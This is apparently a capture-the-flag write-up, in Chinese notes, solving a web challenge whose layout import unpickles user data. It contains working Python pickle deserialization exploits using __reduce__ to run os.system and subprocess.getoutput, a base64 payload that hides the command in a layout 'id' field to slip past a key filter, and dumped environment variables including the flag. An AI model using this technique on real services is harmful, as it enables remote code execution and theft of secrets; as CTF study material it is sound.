## Some notes
1. Serialization, deserialization 分別發生在 app.py 裡面的 `share_layout()`, `import_layout()`
2. Deserialization exploitation 看來常常利用 magic method `__reduce__()` 來達成，此 function 會在物件被反序列化時被呼叫
    > [【第二十九天 - Python 反序列化】  - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10281368)

    ```python
    import pickle
    import base64
    import os

    class Exploit(object):
        def __reduce__(self):
            return (os.system, ('ls',))

    exploit = Exploit()
    print(pickle.loads(pickle.dumps(exploit)))
    ```
3. ~~此題應該無法透過建立 class 來達成，可能得靠特定的 layout 來達成?~~ `dataGuard()` 會對 list layout 中每個 dictionary 的 key 進行檢查，每個 key 都必須為 'id', 'left', 'top' 三者其中之一
4. 
    ```python
    import pickle
    import base64
    import subprocess

    class exploitClass(bytes):
        def __reduce__(self):
            return (subprocess.getoutput, (['env'], ))
        
    exploitInstance = exploitClass()

    DEFAULT_LAYOUT = [
        {'id': exploitInstance, 'left': 350, 'top': 180},
        {'id': 'eye01', 'left': 442, 'top': 275},
        {'id': 'eye02', 'left': 4, 'top': 195},
        {'id': 'eye03', 'left': 8, 'top': 487},
        {'id': 'eye04', 'left': 19, 'top': 764},
        {'id': 'eye05', 'left': 826, 'top': 18},
        {'id': 'eye06', 'left': 853, 'top': 313},
        {'id': 'eye07', 'left': 857, 'top': 524},
        {'id': 'eye08', 'left': 889, 'top': 787},
        {'id': 'lip01', 'left': 536, 'top': 450},
        {'id': 'lip02', 'left': 112, 'top': 361},
        {'id': 'lip03', 'left': 99, 'top': 660},
        {'id': 'lip04', 'left': 113, 'top': 840},
        {'id': 'lip05', 'left': 915, 'top': 212},
        {'id': 'lip06', 'left': 861, 'top': 436},
        {'id': 'lip07', 'left': 876, 'top': 687},
        {'id': 'hair01', 'left': 1122, 'top': 22},
        {'id': 'hair02', 'left': 1270, 'top': 30},
        {'id': 'hair03', 'left': 1162, 'top': 148},
        {'id': 'hair04', 'left': 1128, 'top': 296},
        {'id': 'hako01', 'left': 1131, 'top': 497},
    ]

    payload = base64.b64encode(pickle.dumps(DEFAULT_LAYOUT)).decode()
    print(payload)
    print('\n')

    print(pickle.loads(base64.b64decode(payload)))
    ```

    在 local 端能成功執行 `env`，~~在 server 端未知~~
    ```
    gASVIQIAAAAAAABdlCh9lCiMAmlklIwKc3VicHJvY2Vzc5SMCWdldG91dHB1dJSTlF2UjANlbnaUYYWUUpSMBGxlZnSUTV4BjAN0b3CUS7R1fZQoaAKMBWV5ZTAxlGgKTboBaAtNEwF1fZQoaAKMBWV5ZTAylGgKSwRoC0vDdX2UKGgCjAVleWUwM5RoCksIaAtN5wF1fZQoaAKMBWV5ZTA0lGgKSxNoC038AnV9lChoAowFZXllMDWUaApNOgNoC0sSdX2UKGgCjAVleWUwNpRoCk1VA2gLTTkBdX2UKGgCjAVleWUwN5RoCk1ZA2gLTQwCdX2UKGgCjAVleWUwOJRoCk15A2gLTRMDdX2UKGgCjAVsaXAwMZRoCk0YAmgLTcIBdX2UKGgCjAVsaXAwMpRoCktwaAtNaQF1fZQoaAKMBWxpcDAzlGgKS2NoC02UAnV9lChoAowFbGlwMDSUaApLcWgLTUgDdX2UKGgCjAVsaXAwNZRoCk2TA2gLS9R1fZQoaAKMBWxpcDA2lGgKTV0DaAtNtAF1fZQoaAKMBWxpcDA3lGgKTWwDaAtNrwJ1fZQoaAKMBmhhaXIwMZRoCk1iBGgLSxZ1fZQoaAKMBmhhaXIwMpRoCk32BGgLSx51fZQoaAKMBmhhaXIwM5RoCk2KBGgLS5R1fZQoaAKMBmhhaXIwNJRoCk1oBGgLTSgBdX2UKGgCjAZoYWtvMDGUaApNawRoC03xAXVlLg==


    [{'id': 'LESS_TERMCAP_se=\x1b[27m\nUSER=shang\nLESS_TERMCAP_ue=\x1b[0m\nGIT_ASKPASS=/home/shang/.vscode-server/bin/e8a3071ea4344d9d48ef8a4df2c097372b0c5161/extensions/git/dist/askpass.sh\nSHLVL=1\nGREP_COLOR=37;45\nPWD=/home/shang/repo/ADC-projects/project3/fukuwarai\nLESS_TERMCAP_me=\x1b[0m\nJAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64\nZDOTDIR=/home/shang\n_P9K_TTY=/dev/pts/4\nHOSTTYPE=x86_64\nWSLENV=VSCODE_WSL_EXT_LOCATION/up', 'left': 350, 'top': 180}, {'id': 'eye01', 'left': 442, 'top': 275}, {'id': 'eye02', 'left': 4, 'top': 195}, {'id': 'eye03', 'left': 8, 'top': 487}, {'id': 'eye04', 'left': 19, 'top': 764}, {'id': 'eye05', 'left': 826, 'top': 18}, {'id': 'eye06', 'left': 853, 'top': 313}, {'id': 'eye07', 'left': 857, 'top': 524}, {'id': 'eye08', 'left': 889, 'top': 787}, {'id': 'lip01', 'left': 536, 'top': 450}, {'id': 'lip02', 'left': 112, 'top': 361}, {'id': 'lip03', 'left': 99, 'top': 660}, {'id': 'lip04', 'left': 113, 'top': 840}, {'id': 'lip05', 'left': 915, 'top': 212}, {'id': 'lip06', 'left': 861, 'top': 436}, {'id': 'lip07', 'left': 876, 'top': 687}, {'id': 'hair01', 'left': 1122, 'top': 22}, {'id': 'hair02', 'left': 1270, 'top': 30}, {'id': 'hair03', 'left': 1162, 'top': 148}, {'id': 'hair04', 'left': 1128, 'top': 296}, {'id': 'hako01', 'left': 1131, 'top': 497}]
    ```
    

5. 在 server 端也能成功，F12 查看 layout[0] 的內容
    ```
    id: "HOSTNAME=d3359dd8eeb8\nPYTHON_PIP_VERSION=22.3.1\nHOME=/root\nGPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D\nWERKZEUG_SERVER_FD=3\nPYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/66030fa03382b4914d4c4d0896961a0bdeeeb274/public/get-pip.py\nPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nLANG=C.UTF-8\nPYTHON_VERSION=3.11.1\nPYTHON_SETUPTOOLS_VERSION=65.5.0\nPWD=/app\nPYTHON_GET_PIP_SHA256=1e501cf004eac1b7eb1f97266d28f995ae835d30250bec7f8850562703067dc6\nFLAG=ADL{5hi4W45e_n0_5UP4ir4Ru|https://youtu.be/BVvcQ4ge8Ow}"
    ```
    成功拿到 flag
